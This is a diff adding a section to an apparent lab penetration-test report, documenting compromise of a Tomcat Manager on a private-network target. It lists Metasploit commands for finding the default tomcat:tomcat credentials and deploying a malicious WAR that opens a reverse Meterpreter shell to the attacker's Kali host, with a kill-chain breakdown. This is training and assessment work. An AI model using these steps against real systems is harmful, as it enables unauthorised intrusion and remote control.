@@ -154,3 +154,41 @@ Key findings — 23 open ports in total, including several with well-known vulne
   - **Command & Control:** The reverse TCP Meterpreter session gave an ongoing remote control channel back to Kali.
   - **Actions on Objectives:** Ran sysinfo and getuid to confirm full root-level access to the target.
 - **Outcome / Impact:** Achieved a fourth, independent root-level Meterpreter session via the Java RMI service, demonstrating yet another distinct vulnerability class (insecure default configuration allowing remote class loading).
+
+
+
+---
+
+## Exploit 5: Apache Tomcat Manager Weak Credentials Deployment
+
+- **Service / Port:** HTTP / 8180 (Tomcat)
+- **Vulnerability:** The Tomcat Manager application was left with default, weak credentials (tomcat:tomcat), allowing an authenticated attacker to deploy an arbitrary WAR file — which Tomcat then executes as a web application.
+- **Tool Used:** Metasploit — auxiliary/scanner/http/tomcat_mgr_login (credential discovery) followed by exploit/multi/http/tomcat_mgr_deploy (exploitation)
+- **Why This Tool:** Recon identified Apache Tomcat running on port 8180 with no obvious code-execution bug, so the login scanner was used first to check for weak/default manager credentials — a very common misconfiguration on this platform. Once valid credentials were confirmed, the dedicated deployment module reliably packages and uploads a malicious WAR file through the authenticated manager interface, which would be tedious to replicate by hand via raw HTTP requests.
+- **Steps:**
+  1. `background`
+  2. `back`
+  3. `search tomcat_mgr`
+  4. `use auxiliary/scanner/http/tomcat_mgr_login`
+  5. `set RHOSTS 192.168.100.204`
+  6. `set RPORT 8180`
+  7. `run` — found valid credentials: tomcat:tomcat
+  8. `background` / `back`
+  9. `use exploit/multi/http/tomcat_mgr_deploy`
+  10. `set RHOSTS 192.168.100.204`
+  11. `set RPORT 8180`
+  12. `set LHOST 192.168.100.253`
+  13. `set HttpUsername tomcat`
+  14. `set HttpPassword tomcat`
+  15. `run`
+  16. Confirmed access with `sysinfo` and `getuid` inside the resulting Meterpreter session
+- **Evidence:** evidence/exploit5.png
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives
+  - **Reconnaissance:** The nmap scan identified Tomcat on port 8180; the login scanner then discovered valid weak credentials, extending the reconnaissance into the application layer.
+  - **Weaponization:** Packaging the discovered credentials with the tomcat_mgr_deploy module paired a valid login with a malicious WAR payload.
+  - **Delivery:** The module authenticated to the manager interface and uploaded the WAR file over HTTP.
+  - **Exploitation:** Tomcat deployed and executed the uploaded WAR's JSP payload.
+  - **Installation:** The Java Meterpreter payload executed within the Tomcat application, establishing a foothold.
+  - **Command & Control:** The reverse TCP Meterpreter session gave an ongoing remote control channel back to Kali.
+  - **Actions on Objectives:** Ran sysinfo and getuid, confirming access under the tomcat55 service account.
+- **Outcome / Impact:** Achieved code execution and a Meterpreter session under the Tomcat service account (not root), demonstrating that weak application-level credentials can lead to compromise even without a memory-corruption or backdoor-style bug — though with more limited privileges than the previous four exploits.
